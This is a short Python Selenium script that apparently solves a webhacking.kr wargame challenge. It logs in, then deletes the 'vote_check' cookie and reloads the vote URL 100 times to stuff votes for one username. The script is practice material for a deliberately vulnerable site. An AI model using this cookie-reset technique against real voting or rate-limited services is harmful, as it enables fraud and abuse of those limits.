from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from time import sleep

# selenium setting
driver = webdriver.Chrome(ChromeDriverManager().install())
driver.implicitly_wait(10)


# Webhacking.kr Login
loginURL = 'https://webhacking.kr/login.php'
driver.get(loginURL)

sleep(3)

uid = input('Input ID : ')
upass = input('Input PASS : ')

driver.find_element(
    By.XPATH, '/html/body/div/div[2]/div[1]/div[2]/form/table/tbody/tr[1]/td[2]/input').send_keys(uid)
driver.find_element(
    By.XPATH, '/html/body/div/div[2]/div[1]/div[2]/form/table/tbody/tr[2]/td[2]/input').send_keys(upass)
driver.find_element(
    By.XPATH, '/html/body/div/div[2]/div[1]/div[2]/form/input').click()


# Move to challenge page
URL = 'https://webhacking.kr/challenge/code-5/'
driver.get(URL)


# Find my id & Vote
for i in range(0, 100):
    driver.delete_cookie('vote_check')
    userName = '1unaram620'
    driver.get(f'https://webhacking.kr/challenge/code-5/?hit={userName}')

print('SOLVED!')
